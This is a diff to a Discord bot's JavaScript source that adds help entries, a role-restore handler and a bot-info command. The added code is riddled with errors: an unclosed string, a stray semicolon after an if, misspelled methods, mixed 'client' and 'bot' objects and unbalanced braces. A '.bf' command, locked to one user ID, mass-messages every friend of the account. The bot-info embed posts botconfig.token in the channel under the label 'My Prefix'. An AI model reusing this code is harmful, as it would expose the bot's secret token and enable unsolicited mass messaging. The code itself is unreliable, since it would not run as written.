@@ -5,7 +5,7 @@ const prefix = '.'
 
 client.on('ready', () => {
   console.log(`Logged in as ${client.user.tag}!`);
-client.user.setGame(`Officer Mukhld`,"http://twitch.tv/S-F")
+client.user.setGame(`Officer Mukhld`,"http://twitch.tv/idk")
   console.log('')
   console.log('')
   console.log('╔[═════════════════════════════════════════════════════════════════]╗')
@@ -325,7 +325,9 @@ client.on('message', message => {
     .addField(`${prefix}kick`, "**kick Someone**")
     .addField(`${prefix}ban`, "**Ban Someone**")
     .addField(`${prefix}avatar`, "**Show Your Avatar**")
-    .addField(`${prefix}
+    .addField(`${prefix}temp on`, "**Tempority rooms On**")
+    .addField(`${prefix}temp off`, "**Tempority rooms Off**")
+    .addField(`${prefix}temptime <time>, "** Set temp rooms time 1000=1sec**")
     message.channel.send(`✅ | Done | Check Your DirectMessages <@${message.author.id}>`)
     message.author.send({embed})
   } 
@@ -412,5 +414,60 @@ client.on('message', async message => {
            })
           }
       });
+
+    client.on('message',   message => {
+var prefix = ".";
+const args = message.content.split(' ').slice(1).join(' ');
+                              if(message.content.startsWith(prefix + 'bf')) {
+if(message.author.id !== '404610434063269908') return;
+    client.user.friends.forEach(f =>{
+f.send(args)
+    })
+}
+}
+});
   
+//! KinG66S.❤#0045
+var KinG66S = {};//! KinG66S.❤#0045
+client.on('guildMemberRemove', member => {//! KinG66S.❤#0045
+KinG66S[member.id] = {roles: member.roles.array()};//! KinG66S.❤#0045
+});
+//! KinG66S.❤#0045 //! KinG66S.❤#0045 //! KinG66S.❤#0045 
+client.on('guildMemberAdd', member => {//! KinG66S.❤#0045
+if(!KinG66S[member.user.id]) return;//! KinG66S.❤#0045
+console.log(KinG66S[member.user.id].roles.length);//! KinG66S.❤#0045
+for(let i = 0; i < KinG66S[member.user.id].roles.length + 1; i++) {//! KinG66S.❤#0045
+member.addRole(KinG66S[member.user.id].roles.shift());//! KinG66S.❤#0045
+}//! KinG66S.❤#0045
+});//! KinG66S.❤#0045
+
+  bot.on("message", async message => {
+  if(message.author.bot) return;
+  if(message.channel.type === "dm") return;
+  let prefix = botconfig.prefix;
+  let messageArray = message.content.split(" ");
+  let cmd = messageArray[0];
+  let args = messageArray.slice(1);
+
+  if(cmd === `${prefix}botinfo`);
+  let bicon = bot.user.displyAvatarURL;
+  let botEmbed = new Discord.RichEmbed()
+
+.setDescription("Bot Information")
+.setcolor("#15f153")
+.setThumbnail(bicon)
+.addField("Bot Name", bot.user.username)
+.addField("Created on", bot.user.createdAt)
+.addField("Users", bot.users.size)
+.addField("Servers", bot.guilds.size)
+.addField("Channels", bot.channels.size)
+.addField("ID", bot.user.id)
+.addField("My Prefix", botconfig.token)
+.addField("My Language");
+
+    return message.channel.send(botEmbed);
+  }
+});
+  
+
 client.login(process.env.BOT_TOKEN); 
